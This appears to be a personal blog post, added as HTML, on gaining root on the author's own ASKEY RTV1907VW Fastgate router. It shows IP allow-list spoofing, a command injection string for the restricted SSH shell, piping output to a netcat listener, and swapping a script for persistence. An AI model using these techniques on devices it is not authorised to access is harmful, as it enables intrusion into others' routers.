@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaining Shell Access on the ASKEY RTV1907VW Fastgate</title>
+    <link rel="stylesheet" href="/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/fontawesome-free-7.2.0-web/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar"><div class="logo">AR.</div><ul class="nav-links"><li><a href="/index.html">Back to Home</a></li></ul></nav>
+    <main style="padding-top: 100px; max-width: 800px; margin: 0 auto; min-height: 80vh; padding-bottom: 50px;">
+        <article class="section" style="padding-top: 2rem;">
+            <h1 style="font-size: 2.5rem; margin-bottom: 1rem; color: var(--accent);">Gaining Root on the ASKEY RTV1907VW-D228 Fastgate</h1>
+            <span class="blog-date" style="margin-bottom: 2rem; display: block; color: var(--text-muted); font-family: var(--font-mono);">May 21, 2026</span>
+
+            <div style="background: var(--card-bg); padding: 1.5rem; border-left: 4px solid var(--accent); border-radius: 4px; margin: 2rem 0;">
+                <h4 style="margin-bottom: 0.5rem; color: var(--text-main); font-weight: 600; font-family: var(--font-main);">
+                    <i class="fas fa-box-archive" style="color: var(--accent); margin-right: 0.5rem;"></i>
+                    Archive
+                </h4>
+                <p style="margin-bottom: 0; color: var(--text-muted);">
+                    This is an old project from <strong style="color: var(--text-main);">31 December 2020</strong> the text has been written recently.
+                </p>
+            </div>
+
+            <p>Consumer devices often come with locked-down firmware, analyzing them provides excellent opportunities to understand embedded security. As my ISP recently upgraded my Internet connection to FTTC and gave me a new router, I decided to explore more the old Askey RT1907VW, one of the Fastgate router models from Fastweb. An SQL-injection vulnerability in the login webpage had been previously documented, but it now appeared patched in the latest release, requiring an alternative approach.</p>
+
+            <h3 style="color: var(--accent); margin-top: 2rem; margin-bottom: 1rem;">A fake IP address</h3>
+            <p>Since I didn't have the hardware for serial access, I decided to try with Ethernet ports, starting with a nmap scan. SSH access was available out of the box, unluckily, port 22 was filtered to only permit connections from specific IP addresses, probably Fastweb's subnets. I found the full list of permitted IP addresses thanks to someone who got into the router via serial access on a previous firmware (available <a href="https://slides.poul.org/2018/workshop-interni/fastgate-hacking/#/39">here</a>). I so set up a DHCP server with one of these IP addresses. I so utilized a <code>Raspberry Pi 3B</code>, configured a DHCP server, and connected it directly to the router's WAN port.</p>
+
+            <h3 style="color: var(--accent); margin-top: 2rem; margin-bottom: 1rem;">A custom Shell?</h3>
+            <p>Once established an SSH connection (using credentials documented in the aforementioned POUL presentation), I encountered a restricted custom shell. Standard Bash commands (<code>ls</code>, <code>cat</code>, <code>cp</code>, etc.) were unavailable. Executing <code>help</code> returned a list of permitted utilities, which I explored one by one. One command, <code>nat show</code>, stood out.</p>
+            <p>According to the internal help menu, this command allowed filtering output through an expression. Suspecting a potential lack of <strong>input sanitization</strong>, I tested for command injection using:</p>
+            <pre style="background: var(--bg-color); padding: 1rem; border-radius: 4px; border: 1px solid var(--border); overflow-x: auto; font-family: var(--font-mono); font-size: 0.9rem; margin-bottom: 1.5rem; color: #a6accd;"><code>nat show $(/bin/sh)</code></pre>
+            <p>The command executed without standard output, but it did return Bash errors, confirming the injection vulnerability.<br>
+            <strong style="color: darkgreen;">I was in the shell!</strong></p>
+
+            <h3 style="color: var(--accent); margin-top: 2rem; margin-bottom: 1rem;">Let's see</h3>
+            <p>A blind shell presents specific challenges. Luckily, the <code>netcat</code> package was installed in the system, so I could utilize <code>nc</code> to redirect the output to another device. On my Raspberry Pi, I opened a second terminal window and set up a listening port:</p>
+            <pre style="background: var(--bg-color); padding: 1rem; border-radius: 4px; border: 1px solid var(--border); overflow-x: auto; font-family: var(--font-mono); font-size: 0.9rem; margin-bottom: 1.5rem; color: #a6accd;"><code>nc -lvvp 8082</code></pre>
+            <p>Back in the router's blind shell, I simply appended <code> | nc <RaspberryAddress> 8082</code> to every command I typed. My RaspBerry terminal lit up with the responses. I finally had eyes on the system.</p>
+
+            <h3 style="color: var(--accent); margin-top: 2rem; margin-bottom: 1rem;">Full shell access</h3>
+            <p>The filesystem was mounted as read-only. After enabling read/write access (again, utilizing techniques from the POUL presentation), I sought a method to establish persistence. The permitted shell commands were implemented as Bash scripts, so I selected what it was, in my opinion, the least useful one: <code>/usr/sbin/stshell/ntp.sh</code>.</p>
+            <p>Using a mounted USB drive, I transferred the script to my laptop, replaced its core logic with a straightforward <code>/bin/sh -l<code> command, and backed up the original file on the router. After swapping in the modified script, I restarted the SSH session and executed <code>ntp show<code>. Because the restricted environment was already operating with high privileges, bypassing it immediately dropped me into a Linux shell as root user.</p>
+
+            <h3 style="color: var(--accent); margin-top: 2rem; margin-bottom: 1rem;">The end...?</h3>
+            <p>Running on firmware <strong>0.00.89</strong>, I managed to permanently unlock SSH across the local LAN (<code>192.168.*.*</code>) changing the <code>iptables</code> rules; although, for some reason, it required an Ethernet cable connected to the WAN port after boot to actually open the port SSH port.</p>
+            <p>Aiming to a more user-friendly system, I exported the binary paths to avoid typing full directories for the <code>statusapi</code> tools. However, during a clean-up phase, an improperly scoped command (<code>rm -rf *</code> executed in the wrong directory) inadvertently corrupted the filesystem, bricking the device. Recovery mode via the HTTP port is currently inaccessible.</p>
+
+            <div style="background: var(--card-bg); padding: 1.5rem; border-left: 4px solid var(--accent); border-radius: 4px; margin-top: 3rem;">
+                <h4 style="margin-bottom: 0.5rem; color: var(--text-main); font-weight: 600; font-family: var(--font-main);"><i class="fas fa-skull-crossbones" style="color: var(--accent); margin-right: 0.5rem;"></i>Takeaways</h4>
+                <p style="margin-bottom: 0;">While the hardware is older and currently non-functional, this project successfully demonstrated how to bypass network filtering and chain a command injection vulnerability with shell exfiltration to escape a restricted environment. Furthermore, the accidental system corruption serves as a strong reminder of the critical importance of environment isolation and strict command validation when operating with elevated privileges.</p>
+            </div>
+        </article>
+    </main>
+    <footer>
+        <p style="text-align: center; color: var(--text-muted); font-size: 0.9rem; padding: 2rem;">&copy; <span id="year"></span> Alberto Robazza. All rights reserved.</p>
+        <script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+    </footer>
+</body>
+</html>
